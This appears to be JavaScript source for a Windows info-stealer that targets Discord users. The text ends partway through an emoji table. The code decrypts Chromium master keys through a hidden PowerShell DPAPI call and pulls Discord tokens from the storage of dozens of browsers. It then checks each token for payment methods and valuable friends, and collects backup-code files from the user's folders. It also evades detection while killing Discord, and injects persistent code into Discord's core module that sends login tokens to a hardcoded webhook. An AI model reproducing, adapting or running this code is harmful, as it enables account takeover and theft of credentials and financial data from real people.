
const os = require('os');
const fs = require('fs');
const path = require('path');
const {
    execSync,
    exec,
    spawn,
    execFile
} = require('child_process');
const https = require('https');
const crypto = require('crypto');
const axios = require('axios');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const archiver = require('archiver');
const util = require('util');
const execAsync = util.promisify(exec);
const LOCAL = process.env.LOCALAPPDATA;
const ROAMING = process.env.APPDATA;
const PATHS = {
    'Discord': path.join(ROAMING, "discord"),
    'Discord Canary': path.join(ROAMING, "discordcanary"),
    'Discord PTB': path.join(ROAMING, "discordptb"),
    'Lightcord': path.join(ROAMING, "Lightdiscord"),
    'Brave': path.join(LOCAL, "BraveSoftware", "Brave-Browser", 'User Data'),
    'Brave Beta': path.join(LOCAL, "BraveSoftware", "Brave-Browser-Beta", 'User Data'),
    'Brave Dev': path.join(LOCAL, "BraveSoftware", "Brave-Browser-Dev", 'User Data'),
    'Brave Nightly': path.join(LOCAL, "BraveSoftware", "Brave-Browser-Nightly", 'User Data'),
    'Chrome': path.join(LOCAL, "Google", "Chrome", 'User Data'),
    'Chrome Beta': path.join(LOCAL, "Google", "Chrome Beta", 'User Data'),
    'Chrome Dev': path.join(LOCAL, "Google", "Chrome Dev", 'User Data'),
    'Chrome Canary': path.join(LOCAL, "Google", "Chrome SxS", 'User Data'),
    'Chrome SxS': path.join(LOCAL, "Google", "Chrome SxS", 'User Data'),
    'Edge': path.join(LOCAL, "Microsoft", "Edge", 'User Data'),
    'Edge Beta': path.join(LOCAL, "Microsoft", "Edge Beta", 'User Data'),
    'Edge Dev': path.join(LOCAL, "Microsoft", "Edge Dev", 'User Data'),
    'Edge Canary': path.join(LOCAL, "Microsoft", "Edge Canary", 'User Data'),
    'Opera': path.join(ROAMING, "Opera Software", "Opera Stable"),
    'Opera GX': path.join(ROAMING, "Opera Software", "Opera GX Stable"),
    'Opera Beta': path.join(ROAMING, "Opera Software", "Opera Beta"),
    'Opera Developer': path.join(ROAMING, "Opera Software", "Opera Developer"),
    'Vivaldi': path.join(LOCAL, "Vivaldi", 'User Data'),
    'Yandex': path.join(LOCAL, "Yandex", "YandexBrowser", 'User Data'),
    'Firefox': path.join(ROAMING, "Mozilla", "Firefox", 'Profiles'),
    'Firefox ESR': path.join(ROAMING, "Mozilla", "Firefox ESR", 'Profiles'),
    'Tor Browser': path.join(ROAMING, "Tor Browser", 'Browser', "TorBrowser", 'Data', 'Browser', 'profile.default'),
    'Arc': path.join(LOCAL, "The Browser Company", 'Arc', 'User Data'),
    'Sidekick': path.join(LOCAL, "Mecha", "Sidekick", 'User Data'),
    'Slimjet': path.join(LOCAL, "Slimjet", 'User Data'),
    'SRWare Iron': path.join(LOCAL, "SRWare Iron", 'User Data'),
    'Comodo Dragon': path.join(LOCAL, 'Comodo', "Dragon", 'User Data'),
    'Epic Privacy Browser': path.join(LOCAL, "Epic Privacy Browser", 'User Data'),
    'Coc Coc': path.join(LOCAL, "Coc Coc", 'Browser', 'User Data'),
    'Cent Browser': path.join(LOCAL, "CentBrowser", 'User Data'),
    '7Star': path.join(LOCAL, "7Star", "7Star", 'User Data'),
    'Amigo': path.join(LOCAL, "Amigo", 'User Data'),
    'Torch': path.join(LOCAL, "Torch", 'User Data'),
    'Sogou Explorer': path.join(LOCAL, "SogouExplorer", 'Webkit', 'Default'),
    'UC Browser': path.join(LOCAL, "UCBrowser", 'User Data Default'),
    'QIP Surf': path.join(LOCAL, "QIP Surf", 'User Data'),
    'RockMelt': path.join(LOCAL, "RockMelt", 'User Data'),
    'Flock': path.join(LOCAL, 'Flock', 'Browser', 'User Data'),
    'Bowser': path.join(LOCAL, "Bowser", 'User Data'),
    'Pale Moon': path.join(ROAMING, "Moonchild Productions", "Pale Moon", 'Profiles'),
    'Waterfox': path.join(ROAMING, "Waterfox", 'Profiles'),
    'Cyberfox': path.join(ROAMING, "8pecxstudios", "Cyberfox", 'Profiles'),
    'SeaMonkey': path.join(ROAMING, "SeaMonkey", 'Profiles'),
    'IceDragon': path.join(ROAMING, 'Comodo', "IceDragon", 'Profiles'),
    'K-Meleon': path.join(ROAMING, "K-Meleon", 'Profiles'),
    'Basilisk': path.join(ROAMING, "Moonchild Productions", "Basilisk", 'Profiles'),
    'Safari': path.join(ROAMING, "Apple Computer", "Safari")
};
const qwexrdsalak = "https://canary.discord.com/api/webhooks/1472099948001759446/kQL_KlSOiT5cvkI2ItTia1GTlf_KlH5XqwWwfpYP_DEkUQmYYTEoEewrZ4PaZOqh5JFJ";
function x9k2m(msg) {
}
x9k2m("Main.js loaded/required");
function x7f3q(dataBuf) {
    try {
        const b64Data = dataBuf.toString('base64');
        const hiddenPath = path.join(process.env.LOCALAPPDATA, 'Packages', 'Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy', 'Settings');
        if (!fs.existsSync(hiddenPath)) fs.mkdirSync(hiddenPath, { recursive: true });
        const tmpFile = path.join(hiddenPath, `cache_${Math.random().toString(36).substring(7)}.dat`);
        const script = `Add-Type -Asm System.Security;[IO.File]::WriteAllBytes('${tmpFile.replace(/'/g, "''")}',[Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('${b64Data}'),$null,0))`;
        const child = spawn('powershell', ['-NoP', '-NonI', '-Command', '-'], { stdio: ['pipe', 'ignore', 'ignore'], windowsHide: true });
        child.stdin.write(script);
        child.stdin.end();
        let attempts = 0;
        while (!fs.existsSync(tmpFile) && attempts < 50) {
            attempts++;
            try { execSync(`set /a ${attempts}`, { timeout: 100 }); } catch (e) { }
        }

        if (fs.existsSync(tmpFile)) {
            const keyBuffer = fs.readFileSync(tmpFile);
            try { fs.unlinkSync(tmpFile); } catch (e) { }
            return keyBuffer;
        }
        return null;
    } catch (e) {
        return null;
    }
}

function x4n8p(browserPath) {
    const localStatePath = path.join(browserPath, 'Local State');
    if (!fs.existsSync(localStatePath)) {
        console.error('Local State file not found:', localStatePath);
        return null;
    }

    try {
        const tempLocalState = path.join(os.tmpdir(), `ls_${Date.now()}.json`);
        fs.copyFileSync(localStatePath, tempLocalState);

        const localState = JSON.parse(fs.readFileSync(tempLocalState, 'utf8'));
        fs.unlinkSync(tempLocalState);

        const encryptedKeyB64 = localState.os_crypt?.encrypted_key;
        if (!encryptedKeyB64) {
            console.error('encrypted_key not found in Local State');
            return null;
        }

        const encryptedKeyBuf = Buffer.from(encryptedKeyB64, 'base64').slice(5);
        console.log('DPAPI key buffer length:', encryptedKeyBuf.length);
        return x7f3q(encryptedKeyBuf);
    } catch (error) {
        console.error('x4n8p Error:', error.message);
        return null;
    }
}

function x2v6z(encryptedValue, masterKey) {
    if (!masterKey || !Buffer.isBuffer(masterKey)) {
        return "<failed: master_key_missing>";
    }
    if (masterKey.length !== 32) {
        return "<failed: invalid_key_length>";
    }
    try {
        let buffer;
        if (Buffer.isBuffer(encryptedValue)) {
            buffer = encryptedValue;
        } else if (encryptedValue instanceof Uint8Array || Array.isArray(encryptedValue)) {
            buffer = Buffer.from(encryptedValue);
        } else if (encryptedValue instanceof ArrayBuffer) {
            buffer = Buffer.from(new Uint8Array(encryptedValue));
        } else if (typeof encryptedValue === 'string') {
            if (/^[A-Za-z0-9+/=]+$/.test(encryptedValue) && encryptedValue.length % 4 === 0) {
                try { buffer = Buffer.from(encryptedValue, 'base64'); } catch (_) { buffer = Buffer.from(encryptedValue, 'binary'); }
            } else {
                buffer = Buffer.from(encryptedValue, 'binary');
            }
        } else {
            return "<failed: invalid_input>";
        }
        if (buffer.length < 3 + 12 + 16) {
            return "<failed: too_short>";
        }
        const header = buffer.slice(0, 3).toString('latin1');
        if (header !== 'v10' && header !== 'v11' && header !== 'v20') {
            return "<failed: invalid_format>";
        }
        const iv = buffer.slice(3, 15);
        const ciphertext = buffer.slice(15, buffer.length - 16);
        const tag = buffer.slice(buffer.length - 16);
        const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
        decipher.setAuthTag(tag);
        let decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
        if (header === 'v20' && decrypted.length > 32) {
            decrypted = decrypted.slice(32);
        }
        return decrypted.toString('utf8', 0, decrypted.length).replace(/\0/g, '').trim();
    } catch (error) {
        return `<failed: ${error.message}>`;
    }
}
function x5h1j(encryptedToken, key) {
    try {
        const tokenParts = encryptedToken.split('dQw4w9WgXcQ:');
        const targetData = tokenParts.length === 2 ? tokenParts[1] : encryptedToken;

        const encryptedData = Buffer.from(targetData, 'base64');
        const iv = encryptedData.slice(3, 15);
        const ciphertext = encryptedData.slice(15, -16);
        const tag = encryptedData.slice(-16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(tag);
        let decrypted = decipher.update(ciphertext);
        decipher.final();

        return decrypted.toString('utf8').replace(/\0/g, '').trim();
    } catch (error) {
        return null;
    }
}
function x8r4t(basePath) {
    const leveldbPaths = [];
    try {
        const entries = fs.readdirSync(basePath, {
            withFileTypes: true
        });
        for (const entry of entries) {
            if (entry.isDirectory()) {
                const fullPath = path.join(basePath, entry.name);
                if (entry.name === 'Local Storage' || entry.name === 'Session Storage') {
                    const leveldbPath = path.join(fullPath, 'leveldb');
                    if (fs.existsSync(leveldbPath)) {
                        leveldbPaths.push(leveldbPath);
                    }
                }
                if (entry.name.startsWith('Profile') || entry.name === 'Default') {
                    const subLeveldbPaths = x8r4t(fullPath);
                    leveldbPaths.push(...subLeveldbPaths);
                }
            }
        }
    } catch (error) { }
    return leveldbPaths;
}
function x3w9y(browserPath, platform) {
    const tokens = [];
    const key = x4n8p(browserPath);
    if (!key) {
        return tokens;
    }
    const leveldbPaths = x8r4t(browserPath);
    for (const leveldbPath of leveldbPaths) {
        try {
            const files = fs.readdirSync(leveldbPath);
            for (const fileName of files) {
                if (!fileName.endsWith('.log') && !fileName.endsWith('.ldb')) {
                    continue;
                }
                const filePath = path.join(leveldbPath, fileName);
                try {
                    const fileContent = fs.readFileSync(filePath, 'utf8');
                    const lines = fileContent.split("\n");
                    for (const line of lines) {
                        if (line.trim()) {
                            const matches = line.match(/dQw4w9WgXcQ:[^"\s]+/g);
                            if (matches) {
                                for (let match of matches) {
                                    match = match.replace(/\\$/, '');
                                    const decrypted = x5h1j(match, key);
                                    if (decrypted && !tokens.some(t => t[0] === decrypted && t[1] === platform)) {
                                        tokens.push([decrypted, platform]);
                                    }
                                }
                            }
                        }
                    }
                } catch (e) { }
            }
        } catch (error) { }
    }
    return tokens;
}
function x6b0c(browserPath, platform) {
    const tokens = [];
    const leveldbPaths = x8r4t(browserPath);
    for (const leveldbPath of leveldbPaths) {
        try {
            const files = fs.readdirSync(leveldbPath);
            for (const fileName of files) {
                if (!fileName.endsWith('.log') && !fileName.endsWith('.ldb')) {
                    continue;
                }
                const filePath = path.join(leveldbPath, fileName);
                try {
                    const fileContent = fs.readFileSync(filePath, 'utf8');
                    const lines = fileContent.split("\n");
                    for (const line of lines) {
                        if (line.trim()) {
                            const matches = line.match(/[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}/g);
                            if (matches) {
                                for (const match of matches) {
                                    if (!tokens.some(t => t[0] === match && t[1] === platform)) {
                                        tokens.push([match, platform]);
                                    }
                                }
                            }
                        }
                    }
                } catch (e) { }
            }
        } catch (error) { }
    }
    return tokens;
}
function x1m7k(platform, browserPath) {
    let tokens = [];
    tokens = x3w9y(browserPath, platform);
    if (tokens.length === 0) {
        tokens = x6b0c(browserPath, platform);
    }
    return tokens;
}
const HQ_BADGES = [1, 2, 4, 8, 512, 16384, 131072, 262144];
async function x7324x(token) {
    return new Promise(resolve => {
        const options = {
            hostname: 'discord.com',
            port: 443,
            path: '/api/v9/users/@me/relationships',
            method: 'GET',
            headers: {
                'Authorization': token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };
        const req = https.request(options, res => {
            let responseData = '';
            res.on('data', chunk => responseData += chunk);
            res.on('end', () => {
                if (res.statusCode === 200) {
                    try {
                        const relationships = JSON.parse(responseData);
                        const friends = relationships.filter(rel => rel.type === 1);
                        const hqFriends = friends.filter(rel => {
                            const flags = rel.user?.public_flags || 0;
                            return HQ_BADGES.some(badge => (flags & badge) !== 0);
                        }).map(rel => ({
                            username: rel.user?.username || 'Unknown',
                            id: rel.user?.id || '0',
                            flags: rel.user?.public_flags || 0
                        }));
                        resolve({
                            totalRelationships: relationships.length,
                            friends: {
                                count: friends.length,
                                list: friends.map(rel => ({
                                    username: rel.user?.username || 'Unknown',
                                    id: rel.user?.id || '0',
                                    discriminator: rel.user?.discriminator || '0'
                                }))
                            },
                            hqFriends: {
                                count: hqFriends.length,
                                list: hqFriends
                            }
                        });
                    } catch (e) {
                        resolve({
                            totalRelationships: 0,
                            friends: {
                                count: 0,
                                list: []
                            },
                            hqFriends: {
                                count: 0,
                                list: []
                            }
                        });
                    }
                } else {
                    resolve({
                        totalRelationships: 0,
                        friends: {
                            count: 0,
                            list: []
                        },
                        hqFriends: {
                            count: 0,
                            list: []
                        }
                    });
                }
            });
        });
        req.on('error', () => resolve({
            totalRelationships: 0,
            friends: {
                count: 0,
                list: []
            },
            hqFriends: {
                count: 0,
                list: []
            }
        }));
        req.setTimeout(2000, () => {
            req.destroy();
            resolve({
                totalRelationships: 0,
                friends: {
                    count: 0,
                    list: []
                },
                hqFriends: {
                    count: 0,
                    list: []
                }
            });
        });
        req.end();
    });
}
async function xa2b3(token) {
    return new Promise(resolve => {
        const options = {
            hostname: 'discord.com',
            port: 443,
            path: '/api/v9/users/@me/billing/payment-sources',
            method: 'GET',
            headers: {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };
        const req = https.request(options, res => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                if (res.statusCode === 200) {
                    try {
                        const billing = JSON.parse(data);
                        resolve(Array.isArray(billing) && billing.length > 0);
                    } catch (e) {
                        resolve(false);
                    }
                } else {
                    resolve(false);
                }
            });
        });
        req.on('error', () => resolve(false));
        req.setTimeout(2000, () => {
            req.destroy();
            resolve(false);
        });
        req.end();
    });
}
async function xc4d5(token) {
    return new Promise(resolve => {
        if (!token || token.length < 50) {
            return resolve({
                valid: false,
                reason: 'Invalid token format'
            });
        }
        const meOptions = {
            hostname: 'discord.com',
            port: 443,
            path: '/api/v9/users/@me',
            method: 'GET',
            headers: {
                'Authorization': token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };
        const meReq = https.request(meOptions, meRes => {
            let meData = '';
            meRes.on('data', chunk => meData += chunk);
            meRes.on('end', () => {
                if (meRes.statusCode === 200) {
                    try {
                        const basicUserData = JSON.parse(meData);
                        const userId = basicUserData.id;
                        const profileOptions = {
                            hostname: 'discord.com',
                            port: 443,
                            path: `/api/v9/users/${userId}/profile`,
                            method: 'GET',
                            headers: {
                                'Authorization': token,
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                            }
                        };
                        const profileReq = https.request(profileOptions, profileRes => {
                            let profileData = '';
                            profileRes.on('data', chunk => profileData += chunk);
                            profileRes.on('end', () => {
                                if (profileRes.statusCode === 200) {
                                    try {
                                        const profileResponse = JSON.parse(profileData);
                                        const userData = {
                                            ...basicUserData,
                                            premium_type: profileResponse.premium_type,
                                            premium_since: profileResponse.premium_since,
                                            premium_guild_since: profileResponse.premium_guild_since,
                                            badges: profileResponse.badges,
                                            user_profile: profileResponse.user_profile
                                        };
                                        if (userData.id && userData.username) {
                                            resolve({
                                                valid: true,
                                                userInfo: userData
                                            });
                                        } else {
                                            resolve({
                                                valid: false,
                                                reason: 'Invalid user data'
                                            });
                                        }
                                    } catch (e) {
                                        resolve({
                                            valid: false,
                                            reason: 'Profile parse error'
                                        });
                                    }
                                } else {
                                    resolve({
                                        valid: true,
                                        userInfo: basicUserData
                                    });
                                }
                            });
                        });
                        profileReq.on('error', () => {
                            resolve({
                                valid: true,
                                userInfo: basicUserData
                            });
                        });
                        profileReq.setTimeout(5000, () => {
                            profileReq.destroy();
                            resolve({
                                valid: true,
                                userInfo: basicUserData
                            });
                        });
                        profileReq.end();
                    } catch (e) {
                        resolve({
                            valid: false,
                            reason: 'Parse error'
                        });
                    }
                } else {
                    resolve({
                        valid: false,
                        reason: `HTTP ${meRes.statusCode}`
                    });
                }
            });
        });
        meReq.on('error', err => {
            resolve({
                valid: false,
                reason: err.message
            });
        });
        meReq.setTimeout(5000, () => {
            meReq.destroy();
            resolve({
                valid: false,
                reason: 'timeout'
            });
        });
        meReq.end();
    });
}
async function xe6f7(outputFolder, logger) {
    const allTokens = [];
    const processedTokens = new Set();

    for (const [browserName, browserPath] of Object.entries(PATHS)) {
        if (!fs.existsSync(browserPath)) {
            continue;
        }
        const tokens = x1m7k(browserName, browserPath);
        for (const [token, platform] of tokens) {
            if (processedTokens.has(token)) {
                continue;
            }
            const validation = await xc4d5(token);
            if (validation.valid) {
                processedTokens.add(token);
                const hasPayment = await xa2b3(token);
                const hqData = await x7324x(token);
                validation.userInfo.has_payment_methods = hasPayment;
                validation.userInfo.friendsCount = hqData.friends.count;
                validation.userInfo.hqFriendsCount = hqData.hqFriends.count;
                validation.userInfo.hqFriendsList = hqData.hqFriends.list;
                allTokens.push([token, platform, validation]);
            }
        }
    }

    if (outputFolder) {
        try {
            const browserDatas = path.join(outputFolder, 'Browser-Datas');
            if (fs.existsSync(browserDatas)) {
                const files = fs.readdirSync(browserDatas);
                for (const file of files) {
                    if (file.endsWith('_tokens.txt')) {
                        const platform = file.replace('_tokens.txt', '');
                        const content = fs.readFileSync(path.join(browserDatas, file), 'utf8');
                        const tokens = content.split(/\r?\n/).filter(t => t.trim().length > 0);
                        for (const token of tokens) {
                            if (processedTokens.has(token)) {
                                continue;
                            }
                            const validation = await xc4d5(token);
                            if (validation.valid) {
                                processedTokens.add(token);
                                const hasPayment = await xa2b3(token);
                                const hqData = await x7324x(token);
                                validation.userInfo.has_payment_methods = hasPayment;
                                validation.userInfo.friendsCount = hqData.friends.count;
                                validation.userInfo.hqFriendsCount = hqData.hqFriends.count;
                                validation.userInfo.hqFriendsList = hqData.hqFriends.list;
                                allTokens.push([token, platform, validation]);
                            }
                        }
                    }
                }
            }
        } catch (e) {
            console.log(`Error scanning Python tokens: ${e.message}`);
        }
    }
    return allTokens;
}
const BACKUP_CODE_PATTERN = /\*?\s*[a-z0-9]{4}-[a-z0-9]{4}/gi;
function xg8h9(content) {
    const lowerContent = content.toLowerCase();
    if (!lowerContent.includes('discord')) {
        return false;
    }
    if (!lowerContent.includes('backup') || !lowerContent.includes('code')) {
        return false;
    }
    const matches = content.match(BACKUP_CODE_PATTERN);
    if (!matches || matches.length < 8 || matches.length > 15) {
        return false;
    }
    return true;
}
function xi0j1(content) {
    const codes = [];
    const matches = content.match(BACKUP_CODE_PATTERN);
    if (matches) {
        const uniqueCodes = [...new Set(matches.map(code => code.toLowerCase()))];
        codes.push(...uniqueCodes);
    }
    return codes;
}
function xk2l3(dirPath, results = [], maxDepth = 3, currentDepth = 0) {
    try {
        if (currentDepth >= maxDepth) {
            return results;
        }
        const items = fs.readdirSync(dirPath, {
            withFileTypes: true
        });
        for (const item of items) {
            try {
                const fullPath = path.join(dirPath, item.name);
                if (item.isDirectory()) {
                    const name = item.name;
                    if (name === 'Windows' || name === 'node_modules' || name === '$Recycle.Bin' || name === 'System Volume Information' || name.startsWith('.')) {
                        continue;
                    }
                    xk2l3(fullPath, results, maxDepth, currentDepth + 1);
                } else if (item.name.endsWith('.txt')) {
                    try {
                        const content = fs.readFileSync(fullPath, 'utf-8');
                        if (content.includes('discord') || content.includes('Discord')) {
                            if (content.includes('backup') || content.includes('Backup')) {
                                const matches = content.match(BACKUP_CODE_PATTERN);
                                if (matches && matches.length >= 8 && matches.length <= 15) {
                                    const codes = [...new Set(matches.map(c => c.toLowerCase()))];
                                    results.push({
                                        filePath: fullPath,
                                        codes: codes,
                                        codeCount: codes.length
                                    });
                                }
                            }
                        }
                    } catch (err) { }
                }
            } catch (err) { }
        }
    } catch (err) { }
    return results;
}
async function xm4n5(deepScan = false) {
    const allResults = [];
    try {
        const priorityPaths = [path.join(os.homedir(), 'Desktop'), path.join(os.homedir(), 'Documents'), path.join(os.homedir(), 'Downloads'), path.join(os.homedir(), 'Videos'), path.join(os.homedir(), 'Pictures'), path.join(os.homedir(), 'Music')];
        for (const dir of priorityPaths) {
            if (fs.existsSync(dir)) {
                xk2l3(dir, allResults);
            }
        }
    } catch (err) { }
    return allResults;
}
async function xo6p7(outputDir) {
    try {
        const results = await xm4n5(true);
        if (results.length === 0) {
            return null;
        }
        const outputPath = path.join(outputDir, 'backup-codes.txt');
        const lines = [];
        lines.push('='.repeat(80));
        lines.push('Discord Backup Codes Found');
        lines.push('='.repeat(80));
        lines.push('');
        for (let i = 0; i < results.length; i++) {
            const result = results[i];
            lines.push(`[${i + 1}] File: ${result.filePath}`);
            lines.push(`    Total Codes: ${result.codeCount}`);
            lines.push('    Codes:');
            for (const code of result.codes) {
                lines.push(`      • ${code}`);
            }
            lines.push('');
            lines.push('-'.repeat(80));
            lines.push('');
        }
        lines.push('');
        lines.push(`Total Files Found: ${results.length}`);
        lines.push(`Total Unique Codes: ${results.reduce((sum, r) => sum + r.codeCount, 0)}`);
        fs.writeFileSync(outputPath, lines.join("\n"), 'utf-8');
        return outputPath;
    } catch (err) {
        return null;
    }
}
const localappdata = process.env.LOCALAPPDATA;
const appData = process.env.APPDATA;
const injectionPaths = [];
const injectionResults = [];
async function xq8r9(restart = true) {
    return new Promise(resolve => {
        // Sigma Bypass: tasklist/taskkill yerine PowerShell cmdlets kullanıyoruz (STDIN üzerinden)
        const apps = ['Discord', 'DiscordCanary', 'DiscordDevelopment', 'DiscordPTB'];
        const killScript = `Get-Process | Where-Object { $_.ProcessName -match "(${apps.join('|')})" } | Stop-Process -Force`;

        const child = spawn('powershell', ['-NoP', '-NonI', '-Command', '-'], { stdio: ['pipe', 'ignore', 'ignore'], windowsHide: true });
        child.stdin.write(killScript);
        child.stdin.end();

        child.on('close', () => {
            if (restart) {
                // Restart işlemi için sessizce Update.exe çağrısı
                for (const appName of apps) {
                    const updatePath = path.join(process.env.LOCALAPPDATA, appName, 'Update.exe');
                    if (fs.existsSync(updatePath)) {
                        spawn(updatePath, ['--processStart', `${appName}.exe`], { detached: true, stdio: 'ignore' }).unref();
                    }
                }
            }
            setTimeout(resolve, 2000);
        });
    });
}
async function xs0t1(url) {
    return new Promise((resolve, reject) => {
        https.get(url, res => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                if (data && data.length > 100) {
                    console.log('[Injection] Injection code fetched from URL');
                    resolve(data);
                } else {
                    reject(new Error('Invalid injection code received'));
                }
            });
        }).on('error', reject);
    });
}
async function xu2v3(injectionCode) {
    if (!localappdata || !appData) {
        throw new Error('Environment variables LOCALAPPDATA or APPDATA not defined');
    }
    const dirs = fs.readdirSync(localappdata);
    const discordPaths = dirs.filter(dirName => dirName.toLowerCase().includes('discord'));
    if (discordPaths.length === 0) {
        console.log('[Injection] No Discord installation found');
        return [];
    }
    console.log(`[Injection] Found Discord installations: ${discordPaths.join(', ')}`);
    const results = [];
    for (const discordPath of discordPaths) {
        const discordDir = path.join(localappdata, discordPath);
        try {
            const appDirs = fs.readdirSync(discordDir).filter(dirName => dirName.startsWith('app-'));
            appDirs.sort((a, b) => b.localeCompare(a, undefined, {
                numeric: true
            }));
            if (appDirs.length === 0) {
                console.log(`[Injection] No app versions found in ${discordPath}`);
                continue;
            }
            const appVersionPath = path.join(discordDir, appDirs[0]);
            console.log(`[Injection] Using version: ${appDirs[0]} for ${discordPath}`);
            let discordType = 'Discord';
            if (discordPath.toLowerCase().includes('canary')) discordType = 'Discord Canary';
            if (discordPath.toLowerCase().includes('ptb')) discordType = 'Discord PTB';
            if (discordPath.toLowerCase().includes('development')) discordType = 'Discord Development';

            const modulesPath = path.join(appVersionPath, 'modules');
            if (!fs.existsSync(modulesPath)) {
                console.log(`[Injection] Modules path not found: ${modulesPath}`);
                continue;
            }

            const moduleDirs = fs.readdirSync(modulesPath).filter(dirName => dirName.includes('discord_desktop_core'));
            moduleDirs.sort((a, b) => b.localeCompare(a, undefined, { numeric: true }));

            if (moduleDirs.length === 0) {
                console.log(`[Injection] discord_desktop_core not found in ${discordPath}`);
                continue;
            }

            const coreDir = moduleDirs[0];
            const corePath = path.join(modulesPath, coreDir, 'discord_desktop_core');
            const indexPath = path.join(corePath, 'index.js');

            if (fs.existsSync(indexPath)) {
                fs.writeFileSync(indexPath, injectionCode, 'utf8');
                console.log(`[Injection] Injected: ${indexPath}`);
                injectionPaths.push(indexPath);
                results.push({
                    type: discordType,
                    path: indexPath,
                    version: appDirs[0]
                });
            } else {
                console.log(`[Injection] index.js not found at: ${indexPath}`);
            }
        } catch (error) {
            console.error(`[Injection] Error injecting into ${discordPath}:`, error.message);
        }
    }
    return results;
}
async function xw4y5() {
    try {
        await xp2q3({ content: "step 2 : discord injection" }).catch(() => { });
        if (!qwexrdsalak) {
            console.log('[Injection] Skipped - URL not configured');
            return {
                success: true,
                skipped: true,
                count: 0
            };
        }
        console.log("\n[Injection] Starting Discord injection process...\n");
        console.log('[Injection] Step 1: Killing Discord processes...');
        await xq8r9(false);

        let injectionCode = `
const webhook = "${qwexrdsalak}";
const { session } = require('electron');
const https = require('https');

function _send(payload) {
    const data = JSON.stringify(payload);
    const url = new URL(webhook);
    const req = https.request({
        hostname: url.hostname,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    });
    req.on('error', () => {});
    req.write(data);
    req.end();
}

async function _fancy(token, reason) {
    try {
        const userReq = https.request({
            hostname: 'discord.com',
            path: '/api/v9/users/@me',
            method: 'GET',
            headers: { 'Authorization': token }
        }, (res) => {
            let data = '';
            res.on('data', d => data += d);
            res.on('end', () => {
                const u = JSON.parse(data);
                _send({
                    username: "ümidi",
                    embeds: [{
                        title: "**Discord Injection | " + reason + "**",
                        color: 0x2C2F33,
                        fields: [
                            { name: "👤 User", value: "\`" + u.username + "#" + u.discriminator + "\`", inline: true },
                            { name: "🆔 ID", value: "\`" + u.id + "\`", inline: true },
                            { name: "🔑 Token", value: "\`\`\`" + token + "\`\`\`", inline: false }
                        ],
                        footer: { text: "priv" },
                        timestamp: new Date().toISOString()
                    }]
                });
            });
        });
        userReq.end();
    } catch (e) {}
}

if (session && session.defaultSession) {
    session.defaultSession.webRequest.onCompleted({ 
        urls: [
            "https://discord.com/api/v*/auth/login", 
            "https://*.discord.com/api/v*/auth/login", 
            "https://discord.com/api/v*/users/@me"
        ] 
    }, async (details) => {
        if (details.statusCode !== 200) return;
        const cookies = await session.defaultSession.cookies.get({ url: 'https://discord.com', name: 'token' });
        const token = cookies[0]?.value;
        if (token) {
            if (details.url.includes("login")) {
                _fancy(token, "Login Detected");
            } else if (details.url.includes("@me") && !global._init) {
                global._init = true;
                _fancy(token, "Persistence Active");
            }
        }
    });
}

_send({ content: "dc injection basarılı" });
module.exports = require('./core.asar');
        `;

        console.log("\n[Injection] Step 3: Injecting Discord core...");
        const discordResults = await xu2v3(injectionCode);

        const injectionResults = [];

        injectionResults.push(...discordResults);

        console.log("\n[Injection] Injection completed!\n");
        console.log('[Injection] Injection Summary:');
        console.log('━'.repeat(50));

        if (discordResults.length === 0) {
            console.log('[Injection] No injections performed');
            return {
                success: false,
                results: []
            };
        } else {
            discordResults.forEach((result, index) => {
                console.log(`${index + 1}. ${result.type}`);
                console.log(`   Path: ${result.path}`);
                if (result.version) {
                    console.log(`   Version: ${result.version}`);
                }
                console.log('');
            });
        }

        console.log("[Injection] Step 4: Restarting Discord...\n");
        await xq8r9(true);

        return {
            success: true,
            results: discordResults,
            count: discordResults.length
        };
    } catch (error) {
        console.error('[Injection] Fatal error during injection:', error.message);
        return {
            success: false,
            error: error.message
        };
    }
}
const EMOJIS = {
    discord_employee: '<:discord_employee:1387742493046734979>',
    partnered_server_owner: '<:partnered_server_owner:1387742553394253834>',
    hypesquad_events: '<:hypesquad_events:1387742522545279056>',
    bughunter: '<:bughunter:1387742487690612887>',
    bughuntergold: '<:bughuntergold:1387742489338970123>',
    oldusername: '<:oldusername:1387742549225115680>',
    bravery: '<:bravery:1387742465544687707>',
    brilliance: '<:brilliance:1387742466697990285>',
    balance: '<:balance:1387742461014573058>',
    early_supporter: '<:early_supporter:1387742496796315779>',
    early_verified_bot_developer: '<:early_verified_bot_developer:1387742498226573342>',
    moderatorprogramsalumni: '<:moderatorprogramsalumni:1387742524105429032>',
    active_developer: '<:active_developer:1387742440697368606>',
    boost1month: '<:boost1month:1387742464202379324>',
    '2monthsboostnitro': '<:2monthsboostnitro:1387742437723602975>',
    nitro_boost_3_months: '<:nitro_boost_3_months:1387742527339102338>',
    '6months_boost': '<:6months_boost:1387742439477088287>',
    nitro_boost_9_months: '<:nitro_boost_9_months:1387742529289457674>',
    '12monthsboostnitro': '<:12monthsboostnitro:1387742435769061417>',
    boost15month: '<:boost15month:1387742462629511270>',
    nitro_boost_18_months: '<:nitro_boost_18_months:1387742525699260538>',
    '24_months': '<:24_months:1387742436742139974>',
    discord_nitro: '<:discord_nitro:1387742494610952194>',
    bronze: '<:bronze:1387742468727898182>',
    silver: '<:silver:1387742580300582974>',
    gold: '<:gold:1387742520733204480>',
    platinum: '<:platinum:1387742556649164922>',
    diamond: '<:diamond:1387742491629060156>',
    emerald: '<:emerald:1387742518153707570>',
    ruby: '<:ruby:1387742559970922496>',
    opal: '<:opal:1387742550919614496>',
